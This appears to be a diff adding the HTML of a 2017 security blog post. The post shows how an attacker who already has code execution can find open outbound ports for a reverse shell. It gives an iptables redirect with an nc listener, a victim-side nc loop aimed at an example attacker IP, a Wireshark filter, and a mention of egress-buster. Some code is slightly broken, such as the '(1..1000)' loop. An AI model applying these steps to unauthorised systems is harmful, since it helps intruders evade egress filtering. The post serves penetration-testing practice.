@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="security, vulnhub" name="keywords">
+<meta content="Alex Flores" name="author">
+<meta property="og:title" content="Finding Your Way Out From Behind Firewalls with Strict Outbound Rules - SecBlog">
+<meta property="og:url" content="https://sec.alexflor.es/post/egress-ports/">
+<meta property="og:description" content="Things have been OK for me except that I&#39;m a zombie now">
+<meta property="og:type" content="website" />
+<title>Finding Your Way Out From Behind Firewalls with Strict Outbound Rules | SecBlog</title>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+<link rel="stylesheet" href="https://sec.alexflor.es//css/style.css">
+<link rel="shortcut icon" href="https://sec.alexflor.es//wave.ico">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/github.min.css">
+
+</head>
+
+<body>
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://sec.alexflor.es/"><h1 class="title is-4">SecBlog</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/audibleblink" target="_blank">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/4lex" target="_blank">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://linkedin.com/in/alex2" target="_blank">
+            <span class="icon">
+              <i class="fa fa-linkedin-square"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml" target="_blank">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h1 class="title">Finding Your Way Out From Behind Firewalls with Strict Outbound Rules</h1>
+    <h2 class="subtitle is-5">February 7, 2017 by Alex Flores</h2>
+    
+      <div class="tags">
+    
+        <a class="button is-link" href="/tags/iptables">iptables</a>
+    
+        <a class="button is-link" href="/tags/netcat">netcat</a>
+    
+</div>
+
+    
+    <div class="content">
+      
+
+<p>You&rsquo;ve achieved code execution on a machine, but for some reason your reverse shell isn&rsquo;t pinging you back.
+Or that wget/tftp command isn&rsquo;t downloading your recon/post-exploitation tools. There&rsquo;s a chance you&rsquo;re
+dealing with an egress problem. Typical ports that need outboud access are blocked. You try the main ones
+you can think of (21, 22, 53, 80, 8080, 443), but none of them seem to be connecting. Do you start at 1 and
+manually test? NO! The hallmarks of any decent programmer/hacker is laziness. So let&rsquo;s get lazy.</p>
+
+<h2 id="the-concept">The Concept</h2>
+
+<p>There&rsquo;s a few methods to achieve this, but at each of their cores, these 2 things are happening.</p>
+
+<ul>
+<li>The attacking machine (66.66.66.66) needs to listen for something on every port.</li>
+<li>Your victim machine (23.23.23.23.) needs to try to hit your machine on every port.</li>
+</ul>
+
+<h3 id="netcat-and-iptables">netcat and iptables</h3>
+
+<p><strong>For the attacker</strong></p>
+
+<p>Set all ports to redirect to a listener you&rsquo;ve started.</p>
+
+<pre><code class="language-bash.prettyprint">iface=eth0
+ip=66.66.66.66
+lport=8080
+
+iptables -t nat -A PREROUTING -i $iface -p tcp --dport 1:65535 -j DNAT --to-destination $ip:$lport
+nc -nvlp $lport
+</code></pre>
+
+<p><strong>For the victim machine</strong></p>
+
+<p>*nix:</p>
+
+<pre><code class="language-bash.prettyprint">for port in (1..1000); do
+  echo &quot;Trying $port&quot;
+  nc -z -w1 66.66.66.66 $port
+done
+</code></pre>
+
+<p>Netcat DOES accept ranges, so the following also works: <code>nc -w1 66.66.66.66 1-1000</code>. I usually find
+that the bash loop&rsquo;s logging makes it easier to ID what worked if you walk away for a bit while it
+runs.</p>
+
+<h3 id="wireshark">wireshark</h3>
+
+<p>If you have a GUI available on the attacking machine, you can repeat the above scenario, but
+substitute the iptables and nc commands for wireshark with a sane filter; something like</p>
+
+<pre><code class="language-bash.prettyprint">ip.src == 23.23.23.23
+</code></pre>
+
+<p>You should be able to watch the window for incoming packets and determine on which port
+the victim machine was able to connect.</p>
+
+<h3 id="egress-buster">egress-buster</h3>
+
+<p>If you&rsquo;ve the ability to get files onto the target machine, the most robust option is
+<a href="https://github.com/trustedsec/egressbuster">egress-buster</a>. The readme does a great job explaining
+usage, but it&rsquo;s basically the first method, using iptables and python. It consists of two scripts,
+a client and a server. It also has an option to automatically start the reverse shell once it finds
+an available outgoing part.</p>
+
+    </div>
+    
+        <div class="nav-left">
+    <a class="nav-item" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsec.alexflor.es%2fpost%2fegress-ports%2f" title="Share on Facebook" target="_blank"><span class="fa fa-facebook fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://plus.google.com/share?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fegress-ports%2f" title="Share on Google+" target="_blank"><span class="fa fa-google-plus fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsec.alexflor.es%2fpost%2fegress-ports%2f" title="Share on LinkedIn" target="_blank"><span class="fa fa-linkedin fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://twitter.com/home?status=Finding%20Your%20Way%20Out%20From%20Behind%20Firewalls%20with%20Strict%20Outbound%20Rules - https%3a%2f%2fsec.alexflor.es%2fpost%2fegress-ports%2f" title="Tweet this" target="_blank"><span class="fa fa-twitter fa-2x"></span></a>
+    <a class="nav-item" href="http://www.reddit.com/submit?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fegress-ports%2f&title=Finding%20Your%20Way%20Out%20From%20Behind%20Firewalls%20with%20Strict%20Outbound%20Rules" title="Share on Reddit" target="_blank"><span class="fa fa-reddit-alien fa-2x" aria-hidden="true"></span></a>
+    
+    </div>
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>Untitled.</p>
+  </div>
+</section>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha256-+bhVTaRmJ/c07eV80nU8gD2cBBF0rYkf1txqXlrbvb0=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/go.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/dockerfile.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/javascript.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/python.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/ruby.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-12497311-8', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+</body>
